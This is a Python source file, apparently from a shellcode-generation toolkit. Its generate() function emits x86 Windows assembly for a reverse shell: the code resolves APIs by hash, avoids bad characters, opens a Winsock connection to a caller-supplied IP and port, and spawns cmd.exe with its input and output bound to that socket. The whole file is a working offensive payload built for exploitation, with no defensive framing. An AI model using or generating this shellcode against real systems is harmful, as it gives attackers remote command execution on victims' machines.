from coder.util import (
    convert_ip_addr_hex,
    convert_port_hex,
    find_and_call,
    find_hash_key,
    find_kernel32,
    push_hash,
    push_string,
)


def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
    ip_addr_hex = convert_ip_addr_hex(ip_addr)
    port_hex = convert_port_hex(port)
    hash_key = find_hash_key(
        ["LoadLibraryA", "WSAStartup", "WSASocketA", "WSAConnect", "CreateProcessA"]
        + ([] if no_terminate_process else ["TerminateProcess"]),
        bad_chars,
    )

    return f"""
    start:
        {'int3' if debug else ''}       // Breakpoint for Windbg
        mov   ebp, esp
        add   esp, 0xfffff9f0           // Avoid NULL bytes

    {find_kernel32()}

    save_kernel32:
        mov   [ebp+0x14], ebx

    {find_and_call(hash_key)}

    load_ws2_32:                        // HMODULE LoadLibraryA([in] LPCSTR lpLibFileName);
        {push_string('ws2_32.dll', bad_chars)}
        push  esp                       // lpLibFileName = &("ws2_32.dll")
        {push_hash('LoadLibraryA', hash_key)}
        call dword ptr [ebp+0x04]       // Call LoadLibraryA

    save_ws2_32:
        mov   [ebp+0x18], eax

    call_wsastartup:                    // int WSAStartup(WORD wVersionRequired, [out] LPWSADATA lpWSAData);
        mov   eax, esp                  // eax = esp
        xor   ecx, ecx                  // ecx = 0
        mov   cx, 0x590                 // ecx = 0x590
        sub   eax, ecx                  // Substract CX from EAX to avoid overwriting the structure later
        push  eax                       // lpWSAData = &(lpwsadata) (esp - 0x590)
        xor   eax, eax                  // eax = 0
        mov   ax, 0x0202                // eax = 0x202
        push  eax                       // wVersionRequired = 0x202
        {push_hash('WSAStartup', hash_key)}
        mov   ebx, [ebp+0x18]           // Set WS2_32 Address
        call dword ptr [ebp+0x04]       // Call WSAStartup

    call_wsasocketa:                    // SOCKET WSAAPI WSASocketA([in] int af, [in] int type, [in] int protocol, [in] LPWSAPROTOCOL_INFOA lpProtocolInfo, [in] GROUP g, [in] DWORD dwFlags);
        xor   eax, eax                  // EAX = 0
        push  eax                       // dwFlags = NULL
        push  eax                       // g = NULL
        push  eax                       // lpProtocolInfo = NULL
        mov   al, 0x06                  // eax = 0x6
        push  eax                       // protocol = 0x6
        sub   al, 0x05                  // eax = 0x1
        push  eax                       // type = 0x1
        inc   eax                       // eax = 0x2
        push  eax                       // eax = 0x2
        {push_hash('WSASocketA', hash_key)}
        mov   ebx, [ebp+0x18]           // Set WS2_32 Address
        call dword ptr [ebp+0x04]       // Call WSASocketA
        mov   esi, eax                  // esi = sock

    create_sockaddr_in:                 // typedef struct sockaddr_in {{ADDRESS_FAMILY sin_family = AF_INET (0x2); USHORT sin_port; IN_ADDR sin_addr = 0; CHAR sin_zero[8];}}
        xor   eax, eax                  // eax = 0
        push  eax                       // sin_zero[4:8] = NULL
        push  eax                       // sin_zero[0:4] = NULL
        push  {ip_addr_hex}             // sin_addr = ip_addr
        mov   ax, {port_hex}            // eax = port
        shl   eax, 0x10                 // eax = (port << 0x10)
        add   ax, 0x02                  // eax = (port << 0x10) + 0x2
        push  eax                       // sin_port = port; sin_family = 0x2
        push  esp                       // Set &(sockaddr_in)
        pop   edi                       // edi = &(sockaddr_in)

    call_wsaconnect:                    // int WSAAPI WSAConnect([in] SOCKET s, [in] const sockaddr *name, [in] int namelen, [in] LPWSABUF lpCallerData, [out] LPWSABUF lpCalleeData, [in] LPQOS lpSQOS, [in] LPQOS lpGQOS);
        xor   eax, eax                  // eax = 0
        push  eax                       // lpGQOS = NULL
        push  eax                       // lpSQOS = NULL
        push  eax                       // lpCalleeData = NULL
        push  eax                       // lpCallerData = NULL
        add   al, 0x10                  // eax = 0x10
        push  eax                       // namelen = 0x10
        push  edi                       // *name = &(sockaddr_in)
        push  esi                       // s = sock
        {push_hash('WSAConnect', hash_key)}
        mov   ebx, [ebp+0x18]           // Set WS2_32 Address
        call dword ptr [ebp+0x04]       // Call WSAConnect

    create_startupinfoa:                // typedef struct _STARTUPINFOA {{DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;}}
        push  esi                       // hStdError = sock
        push  esi                       // hStdOutput = sock
        push  esi                       // hStdInput = sock
        xor   eax, eax                  // eax = NULL
        lea   ecx, [eax + 0xd]          // ecx = loop limit

    create_startupinfoa_push_loop:
        push  eax                            // Set NULL dword
        loop  create_startupinfoa_push_loop  // ecx = 0xd; do {{ecx--; ...}} while (ecx > 0)
        mov   al, 0x44                       // eax = 0x44
        push  eax                            // cb = 0x44
        push  esp                            // Set &(startupinfoa)
        pop   edi                            // edi = &(startupinfoa)
        mov   word ptr [edi + 4*11], 0x101   // dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW

    create_cmd_string:
        {push_string('cmd.exe', bad_chars)}
        mov ebx, esp

    call_createprocessa:                // BOOL CreateProcessA([in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, [out] LPPROCESS_INFORMATION lpProcessInformation)
        mov   eax, esp                  // Move ESP to EAX
        xor   ecx, ecx                  // ecx = 0
        mov   cx, 0x390                 // ecx = 0x390
        sub   eax, ecx                  // eax = &(processinformation) (esp - 0x390)
        push  eax                       // lpProcessInformation = &(processinformation)
        push  edi                       // lpStartupInfo = &(startupinfoa)
        xor   eax, eax                  // EAX = 0
        push  eax                       // lpCurrentDirectory = NULL
        push  eax                       // lpEnvironment = NULL
        push  eax                       // dwCreationFlags = NULL
        inc   eax                       // eax = true
        push  eax                       // bInheritHandles = true
        dec   eax                       // EAX = 0
        push  eax                       // lpThreadAttributes = NULL
        push  eax                       // lpProcessAttributes = NULL
        push  ebx                       // lpCommandLine = &("cmd.exe")
        push  eax                       // lpApplicationName = NULL
        {push_hash('CreateProcessA', hash_key)}
        mov   ebx, [ebp+0x14]           // Set Kernel32 Address
        call dword ptr [ebp+0x04]       // Call CreateProcessA

    {
    f'''
    call_terminateprocess:              // BOOL TerminateProcess([in] HANDLE hProcess, [in] UINT uExitCode);
        xor   ecx, ecx                  // ECX = 0
        push  ecx                       // uExitCode = 0
        push  0xffffffff                // hProcess = 0xffffffff
        {push_hash('TerminateProcess', hash_key)}
        mov   ebx, [ebp+0x14]           // Set Kernel32 Address
        call dword ptr [ebp+0x04]       // Call TerminateProcess
    ''' if not no_terminate_process else ''
    }
    """
